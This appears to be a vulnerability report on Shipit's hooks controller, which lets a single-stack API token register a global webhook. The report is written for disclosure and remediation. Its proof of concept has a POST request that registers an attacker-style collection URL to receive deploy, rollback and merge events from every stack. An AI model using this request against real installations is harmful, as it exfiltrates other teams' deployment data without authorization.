### Title
Stack-scoped ApiClient tokens can register global webhooks and receive events for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
An `ApiClient` token that is scoped to a single `Stack` (`ApiClient#stack_id` set) is only checked for the `hook`-scoped permission bit (`read:hook`/`write:hook`) before being allowed to manage `Hook` records. The controller never verifies that the token's `stack_id` binding matches the `Hook`'s scope, so a token authorized for exactly one stack can create a **global** hook that receives webhook-style delivery for every stack in the installation.

### Finding Description
`Shipit::ApiClient` stores an optional `stack` association meant to scope the token's authority (`belongs_to :stack, optional: true`), and `check_permissions!` only checks the coarse `operation:scope` string (e.g. `write:hook`) against `permissions`, with no notion of which stack the operation targets: [1](#0-0) 

`Api::BaseController#stacks` does correctly restrict the `stack`/`stacks` helpers to `current_api_client.stack_id` when the client is scoped: [2](#0-1) 

However, `Api::HooksController` is mounted twice in `config/routes.rb`: once nested under `/api/stacks/*stack_id/hooks`, and once as a top-level `resources :hooks` at `/api/hooks` with no `stack_id` in the path: [3](#0-2) 

`HooksController#hooks` computes the scope purely from whether `params[:stack_id]` is present, defaulting to `nil` (i.e. the **global** hook scope) when it isn't: [4](#0-3) 

Because the controller's `require_permission :write, :hook` only checks `current_api_client.check_permissions!(:write, :hook)` — not whether `current_api_client.stack_id?` — any client holding `write:hook`, even one whose `stack_id` binds it to a single stack, can hit the top-level `/api/hooks` route (no `stack_id` param) and create/read/update/destroy `Hook` records with `stack_id: nil`, i.e. global hooks.

Global hooks are not confined to any stack: `Hook.deliver` fans out events using `for_stack(stack_id)`, which matches `where(stack_id: [nil, stack_id])`, so a `stack_id: nil` hook is delivered for **every** stack's `deploy`, `rollback`, `lock`, `commit_status`, `merge_status`, `merge`, and `pull_request` events: [5](#0-4) 

This breaks the equality that "the stack a token authorizes" (the single `stack` bound to the `ApiClient` record) should equal "the stack(s) it can touch" — instead a single-stack token can touch (observe deploy/rollback/commit-status/merge events for) every stack in the Shipit installation by registering one global hook.

### Impact Explanation
This is a stack-scope escalation: a credential intentionally minted for a single stack (e.g. a CI integration or CCMenu-style client granted `write:hook`) can silently subscribe an attacker-controlled URL to receive deploy/rollback/lock/commit-status/merge/pull_request events for every other stack managed by the Shipit instance, including stacks belonging to different teams/repositories the token holder has no authorization over. This is an unauthenticated-to-the-victim-stack read of stack/task/deploy state exfiltrated to an external URL, matching the High-impact category of "escalation into authorization... unauthenticated read of stack state, task streams or deploy output."

### Likelihood Explanation
Any workflow that issues a stack-scoped `ApiClient` with `write:hook` (or an admin who scopes an existing hook-capable client to one stack, believing that limits its blast radius) is affected. The only precondition is possession of one such scoped token — no repository write access, GitHub credentials, or additional privilege is required to hit the unscoped `/api/hooks` collection route, since it is a normal, always-mounted route.

### Recommendation
- In `Api::HooksController`, when the client is stack-scoped (`current_api_client.stack_id?`), reject requests made through the top-level `/api/hooks` route (or force `stack_id` to `current_api_client.stack_id` regardless of route), so a scoped token can never create/read/update/destroy global (`stack_id: nil`) hooks.
- Alternatively, tie `Hook` visibility/creation directly to `current_api_client.stack_id` whenever the client is stack-scoped, independent of which route/URL was used to reach the controller, mirroring the enforcement already done for `stack`/`stacks` in `Api::BaseController`.

### Proof of Concept
1. Provision (or reuse) an `ApiClient` scoped to `Stack A` only, with permission `write:hook` (e.g. `ApiClient.create!(creator: user, name: 'x', stack: stack_a, permissions: %w[write:hook])`).
2. Using that token's Basic-Auth credentials, call the **top-level** hooks endpoint (no `stack_id` segment):
   ```
   POST /api/hooks
   Authorization: Basic <base64(token)>
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","rollback","commit_status","merge"] }
   ```
   This succeeds because `require_permission :write, :hook` only checks the `write:hook` bit; `HooksController#stack_id` returns `nil` since `params[:stack_id]` is absent, so the created `Hook` has `stack_id: nil` (global).
3. Any deploy/rollback/commit-status/merge event on **any** stack in the Shipit instance now triggers `Hook.deliver`, which matches this global hook via `where(stack_id: [nil, stack_id])`, POSTing that stack's event payload to `https://attacker.example.com/collect` — even though the token was only ever authorized for `Stack A`.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
